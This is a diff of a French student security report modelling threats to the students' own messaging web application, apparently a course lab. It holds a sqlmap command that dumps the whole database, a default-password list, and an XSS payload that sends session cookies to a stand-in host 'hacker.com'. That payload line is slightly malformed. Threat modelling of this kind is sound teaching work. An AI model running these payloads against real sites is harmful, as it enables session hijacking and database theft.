@@ -1,5 +1,4 @@
 \documentclass[a4paper,10pt]{article}
-%\documentclass[a4paper,10pt]{scrartcl}
 \usepackage[left=2cm,right=2cm,top=3cm,bottom=2.5cm,headheight=1.5cm]{geometry}
 \usepackage[french]{babel}
 \usepackage[utf8]{inputenc}
@@ -9,6 +8,7 @@
 \usepackage{graphicx}
 \usepackage{float}
 \usepackage{listings}
+\usepackage{hyperref}
 
 \title{STI_Projet2_Plancherel_Vallon_rapport}
 \author{Plancherel Noemie & Vallon Axel}
@@ -167,7 +167,7 @@
      \item \textbf{Potentialité}: haute
     \end{itemize}
     \end{onehalfspacing}
-    \subsection*{Cybercrime (spam, maliciels}
+    \subsection*{Cybercrime (spam, maliciels)}
     \begin{onehalfspacing}
     \begin{itemize}
      \item \textbf{Motivation}: financières (rançons ou revente de données)
@@ -191,31 +191,51 @@
      \item \textbf{Potentialité}: moyenne
     \end{itemize}
     \end{onehalfspacing}
-    \section*{Scénario d'attaques}
+    \section*{Scénarios d'attaques}
     \subsection*{Scénario de menace 1: Deviner des mots de passe}
         \paragraph{Impact sur l'entreprise} Haut
         \paragraph{Source de menace} Hacker, Cybercrime, Employé, Concurrent
-        \paragraph{Motivation} Pour les hackers, l'attaque peut être vue comme un amusement ou un défi personnel. Pour les concurrents ou un cybercrime, le but premier serait d’avoir accès à l’application de messagerie. Pour un employé, ce serait de se faire passer pour quelqu’un d’autre de l’entreprise, de lire les messages ou d’utiliser des fonctionnalités d’administrateur
+        \paragraph{Motivation} Pour les hackers, l'attaque peut être vue comme un amusement ou un défi personnel. Pour les concurrents ou un cybercrime, le but principal serait d’avoir accès à l’application de messagerie. Pour un employé, ce serait de se faire passer pour quelqu’un d’autre de l’entreprise, de lire les messages ou d’utiliser des fonctionnalités d’administrateur
         \paragraph{Actif ciblé} Utilisateurs (credentials)
-        \paragraph{Scénario d'attaque}
-        \paragraph{Contre-mesures}
+        \paragraph{Scénarios d'attaque} On peut tenter de deviner des mots de passe en les séléctionnant des manières suivantes:
+        \begin{onehalfspacing}
+        \begin{enumerate}
+        \item des valeurs par défaut lors de la création d'une application web avec authentification
+        \item des valeurs fréquemment utilisées dans la langue de l'application (dictionnaire)
+        \item des valeurs pouvant être devinées si on connaît personnellement l'utilisateur  \\
+        \end{enumerate}
+        \end{onehalfspacing}
+        Pour la première attaque, on peut tester les mots de passe
+        \begin{enumerate}
+        \item[] \verb|root|
+        \item[] \verb|admin|
+        \item[] \verb|1234|
+        \item[] \verb|password|
+        \item[] \verb|username| (nom de l'utilisateur) \\
+        \end{enumerate}
+        Pour la seconde attaque, on peut regarder dans les dictionnaires des langues avec les mots de passe fréquemment utilisés (par exemple \verb|rockyou.txt| pour la langue anglaise). Pour une application web en français, on peut utiliser ce dictionnaire \url{https://github.com/tarraschk/richelieu}. \\
+        
+        Finalement, pour la dernière attaque, on peut deviner les mots de passe d'un utilisateur qu'on pourrait connaître personnellement. Dans ce cas, on peut tester sa date de naissance, son prénom, sa ville d'habitation, ses animaux, etc...
+        \paragraph{Contre-mesures} Nous constatons que dans la situation actuelle, lorsqu'un utilisateur veut modifier son mot de passe ou que l'administrateur crée un compte utilisateur, il n'y a aucun critère obligatoire, donc il est possible de configurer des mots de passe très simples et facilement devinables. \\
+        
+        Pour contrer cela, on peut demander de respecter des conditions pour que le mot de passe soit fort. Les conditions peuvent être: minimum de 8 caractères, d'un nombre, d'un caractère spécial. On peut également générer un mot de passe aléatoire fort (avec 18 caractères alphanumériques) lorsque l'administrateur crée un compte pour un collaborateur et le mot de passe lui serait communiqué de manière sécurisée par la suite.
     \subsection*{Scénario de menace 2: Vol de base de données (injection SQL)}
         \paragraph{Impact sur l'entreprise} Haut
         \paragraph{Source de menace} Hacker, Cybercrime, Concurrent
         \paragraph{Motivation} La motivation principale de la récupération de données, sensibles ou non, de la base de données, est financière
         \paragraph{Actif ciblé} Base de données des utilisateurs et des messages
-        \paragraph{Scénario d'attaque} Étant donné que la base de données n’est pas directement retournée au formulaire, car il permet uniquement la vérification de l’authentification, on peut utiliser l’outil sqlmap qui permet d’effectuer des injections SQL. Il permet d’identifier puis exploiter une injection SQL sur des applications web. \\
+        \paragraph{Scénario d'attaque} Étant donné que la base de données n’est pas directement retournée au formulaire, car il permet uniquement la vérification de l’authentification, on peut utiliser l’outil \verb|sqlmap| qui permet d’effectuer des injections SQL. Il permet d’identifier puis exploiter une injection SQL sur des applications web. \\
         
         On peut premièrement vérifier sur le code source de la page web, quels sont les champs du formulaire qui sont envoyés en POST et depuis quelle page. Une fois cela vérifié, on exécute l’outil \verb|sqlmap| avec les paramètres suivants:
         
         \begin{onehalfspacing}
         \begin{itemize}
-        \item \verb|--url|: URL cible pour tester les injections
-        \item \verb|--data|: données qui doivent être envoyées dans la requête POST
-        \item \verb|--dbms|:  précise le type de base de données utilisée
-        \item \verb|--risk|: différents risques d’attaques. Ci-dessous le risque 3 effectue des attaques lourdes
-        \item \verb|--level|: différents niveaux d’attaques. Ci-dessous le niveau 5 effectue des attaques lourdes
-        \item \verb|--dump-all|: extraire les données de la DB \\
+        \item[] \verb|--url|: URL cible pour tester les injections
+        \item[] \verb|--data|: données qui doivent être envoyées dans la requête POST
+        \item[] \verb|--dbms|:  précise le type de base de données utilisée
+        \item[] \verb|--risk|: différents risques d’attaques. Ci-dessous le risque 3 effectue des attaques lourdes
+        \item[] \verb|--level|: différents niveaux d’attaques. Ci-dessous le niveau 5 effectue des attaques lourdes
+        \item[] \verb|--dump-all|: extraire les données de la DB \\
         \end{itemize}
         \end{onehalfspacing}
         En exécutant la commande suivante, il est possible de récupérer toutes les données de la base de données de l'application web.
@@ -223,30 +243,67 @@
 python2 sqlmap.py --url=http://localhost:8080/verificationLogin.php --data="inputLogin=111&inputPassword=222" --dbms=SQLite --risk=3 --level=5 --dump-all
 \end{lstlisting}
         \paragraph{Contre-mesures}
+        Afin d'éviter les injections SQL, on peut ajouter ces mesures:
+        \begin{onehalfspacing}
+        \begin{itemize}
+        \item Préparer les requêtes SQL:
+        \begin{lstlisting}[language=php]
+$sql = "SELECT username FROM users";
+$query = $pdo->prepare($sql);
+$query->execute();
+\end{lstlisting}
+        \item Contrôler les entrées utilisateurs sur les formulaires (aussi pour les formulaires de connexion)
+        \item Ajouter des privilèges sur la base de données (principe de moindre privilège) en ajoutant des rôles pour les comptes.
+        \item Hasher les mots de passe stockés en base de données afin d'éviter que l'attaquant exploite la vulnérabilité.
+        \end{itemize}
+        \end{onehalfspacing}
     \subsection*{Scénario de menace 3: Bruteforce de mots de passe}
         \paragraph{Impact sur l'entreprise} Haut
         \paragraph{Source de menace} Hacker, Cybercrime, Employé, Concurrent
         \paragraph{Motivation}  Pour les hackers, l'attaque peut être vue comme un amusement ou un défi personnel. Pour les concurrents ou un cybercrime, le but premier serait d’avoir accès à l’application de messagerie. Pour un employé, ce serait de se faire passer pour quelqu’un d’autre de l’entreprise, de lire les messages ou d’utiliser des fonctionnalités d’administrateur
-        \paragraph{Actif ciblé}
+        \paragraph{Actif ciblé} Utilisateurs (credentials)
         \paragraph{Scénario d'attaque}
+        Pour effectuer un bruteforce sur les mots de passe, on peut utiliser des outils qui existent déjà avec des dictionnaires qui permettent de tester des milliers de combinaisons différentes. Sachant que le nombre de tentatives du mot de passe est illimité, il est possible d'effectuer plusieurs requêtes différentes. \\
+        
+        Cette attaque peut prendre du temps en fonction de la complexité et la longueur des mots de passe des utilisateurs de l'application.
         \paragraph{Contre-mesures}
+        On peut contrer cette attaque en ajoutant un maximum de tentive de mots de passe par adresse IP. On peut aussi ajouter des mots de passe forts aux comptes utilisateurs (voir \textit{Scénario 1}).
     \subsection*{Scénario de menace 4: Vol de mots de passe (interception)}
         \paragraph{Impact sur l'entreprise} Haut
         \paragraph{Source de menace} Employé (ou quelqu’un qui aurait accès au réseau interne de l’entreprise)
         \paragraph{Motivation} Le but peut être de se faire passer pour quelqu’un d’autre de l’entreprise, de lire de les messages ou d’utiliser les fonctionnalités d’administrateur
         \paragraph{Actif ciblé} Utilisateurs (credentials)
-        \paragraph{Scénario d'attaque} On peut effectuer l’attaque en utilisant un sniffer de réseau comme Wireshark. Si le protocole utilisé est HTTP, les identifiants de l’utilisateur sont envoyés en clair et il est possible de capturer la trame.
+        \paragraph{Scénario d'attaque} On peut effectuer l’attaque en utilisant un sniffer de réseau comme Wireshark. Si le protocole utilisé est HTTP, les identifiants de l’utilisateur sont envoyés en clair sur le réseau et il est possible de capturer la trame.
         \begin{figure}[H]
-        \includegraphics[scale=0.3]{scenario4_1.png}
+        \includegraphics[scale=0.35]{scenario4_1.png}
         \centering
         \end{figure}
         \paragraph{Contre-mesures}
+         Pour éviter une attaque de type \textit{Man in the middle}, il est nécessaire d'ajouter SSL/TLS à l'application web afin de chiffrer le trafic et d'éviter l'utilisation du protocole HTTP.
     \subsection*{Scénario de menace 5: Vol de session}
         \paragraph{Impact sur l'entreprise} Haut
         \paragraph{Source de menace} Hackers, Concurrent, Employé (avec des compétences avancées)
-        \paragraph{Motivation}
-        \paragraph{Actif ciblé} Utilisateurs, Administrateur
-        \paragraph{Scénario d'attaque}
+        \paragraph{Motivation} Pour un hacker, cela peut être pour un défi personnel ou un amusement. Pour un concurrent cela pourrait être pour avoir des accès administrateurs et accéder aux messages afin de les lire. Finalement, pour un utilisateur, le but principal serait de se faire passer pour quelqu'un d'autre.
+        \paragraph{Actif ciblé} Utilisateurs, fonctionnalités avancées d'un administrateur, messages
+        \paragraph{Scénario d'attaque} Cette attaque demande à l'attaquant d'être authentifié au préalable sur l'application. \\
+        
+        L'attaque exploite une vulnérabilité XSS qui permet de récupérer le cookie de session d'un utilisateur. Ainsi, pour ce scénario, nous allons montrer comment il est possible de récupérer le cookie de session de l'administrateur. Nous précisons que cette attaque ne fonctionne seulement si le site est vulnérables aux attaques XSS et n'a aucune protection contre ces dernières. \\
+        
+        Il est possible de le vérifier en envoyant un message à un utilisateur avec une injection HTML dans le contenu du message (pas très discret):
+        \begin{lstlisting}[language=html]
+<script>alert('Hi!');</script>
+\end{lstlisting} 
+
+        À présent, on peut récupérer le cookie de session de l'administrateur à l'aide de l'objet \verb|location.cookie| et on va le rediriger sur une URL de l'attaquant à l'aide de l'objet DOM \verb|document.location|. On ajoute l'injection HTML dans le message qu'on envoie à l'administrateur:
+                \begin{lstlisting}[language=html]
+<script>document.location="http://hacker.com/cookiestealer.php?cookie="document.cookie;</script>
+\end{lstlisting} 
+Dès que l'administrateur ouvre le message, il va directement faire une requête sur le site de l'attaquant avec sa session:
+        \begin{lstlisting}
+http://hacker.com/cookiestealer.php?cookie=PHPSESSID=riqbmmcaclh148j631uinq8375
+\end{lstlisting} 
+L'attaquant peut récupérer l'id de session et le remplacer avec sa session actuelle. Ainsi, il pourra s'authentifier sur le compte administrateur.
+
         \paragraph{Contre-mesures}
     \subsection*{Scénario de menace 6: Denial Of Service (DOS)}
         \paragraph{Impact sur l'entreprise} Moyen à haut (indisponibilité du service de messagerie)
